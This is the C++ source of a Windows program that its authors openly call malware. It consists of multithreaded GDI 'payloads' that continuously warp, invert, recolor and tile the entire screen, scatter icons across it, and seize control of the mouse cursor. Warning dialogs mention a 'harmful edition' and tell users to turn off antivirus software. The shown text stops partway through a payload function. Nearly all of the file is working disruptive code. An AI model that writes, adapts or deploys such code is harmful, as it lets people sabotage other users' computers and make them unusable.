﻿// shpxvatanmne.cpp : Определете точка влизане на приложението.
//
//
//shpxvatanmne.exe: Callback?
//my new malware, collab with UltraDasher965(my first collab, not fake collab like fuckass MazeIcon)

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define RGBBRUSH (DWORD)0x1900ac010e
#define random rand
#define DESKTOP_WINDOW ((HWND)0)
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
LPCWSTR msgboxtext = L"Warning! This program is a computer virus that known as 'shpxvatanmne'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.";
LPCWSTR finalmsgboxtext = L"Final warning!!!\r\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The author of this computer virus(LambdaTechnology&UltraDasher965) isn't responsible!!!";
LPCWSTR title = L"shpxvatanmne.exe--First Warning";
LPCWSTR finaltitle = L"shpxvatanmne--FINAL WARNING";
using namespace std;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
struct Point3D {
	float x, y, z;
};
float WrapAngle(float angle) {
	while (angle >= 360.0f) angle -= 360.0f;
	while (angle < 0.0f) angle += 360.0f;
	return angle;
}
void DrawEllipseAt(HDC hdc, int x, int y) {
	HINSTANCE HSHELL32 = LoadLibrary(_T("Shell32.dll"));
	HINSTANCE HIMAGERES = LoadLibrary(_T("Imageres.dll"));
	HINSTANCE HMORICONS = LoadLibrary(_T("Moricons.dll"));
	HINSTANCE HPIFMGR = LoadLibrary(_T("Pifmgr.dll"));
	HICON load[9] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HIMAGERES,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 38))),LoadIcon(HPIFMGR,MAKEINTRESOURCE(1 + (rand() % 113))),LoadCursor(NULL,MAKEINTRESOURCE(101 + rand() % 18)) ,LoadCursor(NULL,MAKEINTRESOURCE(32640 + rand() % 30)) ,LoadCursor(NULL,MAKEINTRESOURCE(32512 * rand() % 5)), LoadCursor(NULL,MAKEINTRESOURCE(32631)) };
	DrawIcon(hdc, x, y, load[rand() % 9]);
}
Point3D RotatePoints(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);
	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y;
	point.z = z;
	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x;
	point.z = z;
	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x;
	point.y = y;
	return point;
}
void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};
	POINT screenPoints[8];
	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoints(vertices[i], angleX, angleY, angleZ);
		//COLORREF color = COLORHSL(colorA);
		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);
		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;
		DrawEllipseAt(hdc, screenX, screenY);
	}
	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);
	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);
	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}
int DrawIconFunction(int x, int y, int size, HICON hIcon) {
	HDC hdc = GetDC(0);
	DrawIconEx(hdc, x, y, hIcon, size, size, NULL, NULL, DI_NORMAL);
	ReleaseDC(0, hdc);
	DestroyIcon(hIcon); DeleteObject(hIcon);
	return 1;
}
VOID WINAPI CircleFunction(HDC hdc, int x, int y, int w, int h) {
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	HBRUSH hBrush = CreateSolidBrush(RndRGB);
	SelectObject(hdc, hBrush);
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	DeleteObject(hrgn); DeleteObject(hBrush);
}
DWORD WINAPI CursorMoving(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int signX = 1, signY = 1, signX1 = 1, signY1 = 1, incrementor = 10, x = 10, y = 10, radius = 100, angle = 0, count = 0;
	POINT cursor;
	CURSORINFO pci;
	while (true) 
	{
		hdc = GetDC(HWND_DESKTOP);
		pci.cbSize = sizeof(pci);
		GetCursorInfo(&pci);
		GetCursorPos(&cursor);
		x += incrementor * signX;
		y += incrementor * signY;
		SetCursorPos(x, y);
		int X = cursor.x + (radius * cos(angle * 3.1415926 / 14)), Y = cursor.y + (radius * sin(angle * 3.1415926 / 14));
		DrawIcon(hdc, X, Y, pci.hCursor);
		DrawIcon(hdc, cursor.x, cursor.y, pci.hCursor);
		if (y >= GetSystemMetrics(SM_CYSCREEN)) { signY = -1; }
		if (x >= GetSystemMetrics(SM_CXSCREEN)) { signX = -1; }
		if (y == 0) { signY = 2; }
		if (x == 0) { signX = 2; }
		angle++;
		if (count == 10) { count = 0; Sleep(1); }
		else { count++; }
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload1_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	double angle = 0.f;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int cx = abs(x - (w / 2));
				int cy = abs(y - (h / 2));
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;
				int fx = i * ((int)(cbrt((cx * cx) + (cy * cy))) + (((zx + i) ^ (zy - i)) | ((zx - i) & (zy + i))));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		angle += 0.1f;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload1_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(0, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, -1, -1, w, h, hdc, 2, 2, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
		SelectObject(hdc, bmpcopy);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload2_num1(LPVOID lparam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x += 35) {
			for (int y = 0; y < h; y += 35) {
				if (rand() % 8 != 1) { StretchBlt(hdcCopy, x, y, 35, 35, hdcCopy, x, y, 20, 20, SRCAND); }
				else { StretchBlt(hdcCopy, x, y, 35, 35, hdcCopy, x, y, 20, 20, SRCPAINT); }
			}
		}
		//for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb %= RndRGB; }
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(10);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload2_num2(LPVOID lparam) {//by UltraDasher965
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
		BitBlt(hdc, rand() % 20, 0, w, h, hdc, rand() % 20, 0, NOTSRCCOPY);
		BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, PATINVERT);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
		BitBlt(hdc, rand() % w, 10 - rand() % 20, 100, h, hdc, rand() % w, rand() % 20, SRCCOPY);
		BitBlt(hdc, 10 - rand() % 20, rand() % h, w, 100, hdc, rand() % 20, rand() % h, SRCCOPY);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload2_num3(LPVOID lpParam) {
	HICON hIcon;
	int size = 0, w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	srand(time(NULL));
	while (true) 
	{
		hIcon = LoadIcon(0, lpIconNames[rand() % 6]); size = 32 + rand() % 118;
		DrawIconFunction(rand() % w, rand() % h, size, hIcon);
		Sleep(20);
		hIcon = LoadCursor(0, lpCursorNames[rand() % 16]); size = 32 + rand() % 118;
		DrawIconFunction(rand() % w, rand() % h, size, hIcon);
		Sleep(20);
	}
}
DWORD WINAPI Payload3_num1(LPVOID lparam) {//by UltraDasher965, but i add patinvert
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hdcCopy, bmp);
	RECT rect;
	POINT lpt[3];
	while (true)
	{
		hdc = GetDC(0);
		INT counter = sin(i / 10.f) * 100;
		GetWindowRect(GetDesktopWindow(), &rect);
		lpt[0].x = rect.left + counter;
		lpt[0].y = rect.top - counter;
		lpt[1].x = rect.right + counter;
		lpt[1].y = rect.top + counter;
		lpt[2].x = rect.left - counter;
		lpt[2].y = rect.bottom - counter;
		PlgBlt(hdc, lpt, hdc, rect.left - 20, rect.top - 20, (rect.right - rect.left) + 40, (rect.bottom - rect.top) + 40, 0, 0, 0);
		i++;
		SelectObject(hdc, CreateSolidBrush(RndRGB));
		PlgBlt(hdcCopy, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload3_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		HDC hdc = GetDC(0);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY), a = 1 + rand() % 64, b = 1 + rand() % 64;
		for (int y = 0; y <= h; y += 16 * wdpi / 96) {
			if (rand() % 2 == 0) { StretchBlt(hdc, -a * tan((float)b * y), y, w, 10, hdc, 0, y, w, 10, NOTSRCCOPY); }
			else { StretchBlt(hdc, -a * sin((float)b * y), y, w, 10, hdc, 0, y, w, 10, NOTSRCERASE); }
			Sleep(1);
		}
		ReleaseDC(NULL, hdc);
	}
	return 0;
}
DWORD WINAPI Payload4_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int i = 0, xxx = 0, w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 40, w, h, 1, 24 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
	PRGBQUAD prgbScreen = { 0 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, 0, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				prgbScreen[index].r = sin((x + i) * (3.1415926 / (w / 50))) * 128 + 128;
				prgbScreen[index].g = cos(((x ^ y) + xxx) * ((w + h) / 4)) * 32;
				prgbScreen[index].b = sin((y + i) * (3.1415926 / (w / 50))) * 128 + 128;
			}
		}
		for (int y = 0; y < h; y += 20) { StretchBlt(hdcCopy, -1 + rand() % 3, y, w, 20, hdcCopy, 0, y, w, 20, SRCAND); }
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(1);
		i += 5, xxx += 20;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload5_num1(LPVOID lparam) {//credits to camellia-y7x, but i modified it
	srand(time(NULL));
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2), rndsize2 = 1 + rand() % (h / 2), xxx = 0, yyy = 2;
	double angle = 0;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	BLENDFUNCTION blur = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			rgbScreen[i].rgb += yyy ^ (i | xxx + ((x + xxx) ^ (x >> y)));
		}
		for (int yyy = 0; yyy < h; yyy += rndsize) { StretchBlt(hdcCopy, -2 + rand() % 5, yyy, w, rndsize, hdcCopy, 0, yyy, w, rndsize, SRCPAINT); }
		for (int yyy = 0; yyy < h; yyy += rndsize2) { StretchBlt(hdcCopy, -5 + rand() % 11, yyy, w, rndsize2, hdcCopy, 0, yyy, w, rndsize2, SRCAND); }
		for (float i = 0; i < w + h; i += 0.99f) {
			int a = sin(angle) * 360;
			BitBlt(hdc, 0, i, w, 1, hdc, a, i, SRCCOPY);
			angle += PI / 3;
			DeleteObject(&i); DeleteObject(&a);
		}
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
		Sleep(1);
		xxx += 4;
		yyy ^= 2;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload5_num2(LPVOID lparam) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL), hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		LPCSTR text = "       ";
		int a, fontx = rand() % w, fonty = rand() % h, xx = rand() % w, yy = rand() % h;
		SetBkColor(hcdc, RndRGB);
		SetTextColor(hcdc, RndRGB);
		HFONT font = CreateFont(48, 24, 0, 0, rand() % 901, true, true, true, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, L"Comic Sans MS");
		SelectObject(hcdc, font);
		TextOutA(hcdc, fontx, fonty, text, strlen(text));
		POINT point[3];
		point[0].x = xx; point[0].y = yy;
		point[1].x = xx + rand() % (w - xx); point[1].y = yy + rand() % (h - yy);
		point[2].x = rand() % (w + xx); point[2].y = rand() % (h + yy);
		int textw = strlen(text);
		PlgBlt(hdc, point, hcdc, fontx, fonty, textw * 24, 48, 0, fontx, fonty);
		//BitBlt(hdc, fontx, fonty, textw[tmp] * a / 2, a, hcdc, fontx, fonty, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(font);
		DeleteObject(point);
		Sleep(5);
	}
	DeleteDC(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
DWORD WINAPI Payload6_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	PRGBQUAD rgbScreen = { 0 };
	bmp = CreateDIBSection(hdc, &bmpi, NULL, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += ~(x & y) | ((y + x) * i);
		}
		i++;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}

DWORD WINAPI Payload6_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdc, -10, -10, (w / 2) + 20, (h / 2) + 20, hdc, 0, 0, w / 2, h / 2, SRCCOPY);
		StretchBlt(hdc, (w / 2) + 10, 10, (w / 2) - 20, (h / 2) - 20, hdc, w / 2, 0, w / 2, h / 2, SRCCOPY);
		StretchBlt(hdc, 10, (h / 2) + 10, (w / 2) - 20, (h / 2) - 20, hdc, 0, h / 2, w / 2, h / 2, SRCCOPY);
		StretchBlt(hdc, (w / 2) - 10, (h / 2) - 10, (w / 2) + 20, (h / 2) + 20, hdc, w / 2, h / 2, w / 2, h / 2, SRCCOPY);
		Sleep(100);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload7_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0, rndsize = 1 + rand() % (h / 2), xxx = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = ((x ^ y) + (i * (2 | xxx)) + (xxx & y) + (i * 10));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 200, 1.f);
				hslcolor.s += 1.f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		for (int yyy = 0; yyy < h; yyy += rndsize) { StretchBlt(hdcCopy, -2 + rand() % 5, yyy, w, rndsize, hdcCopy, 0, yyy, w, rndsize, NOTSRCERASE); }
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
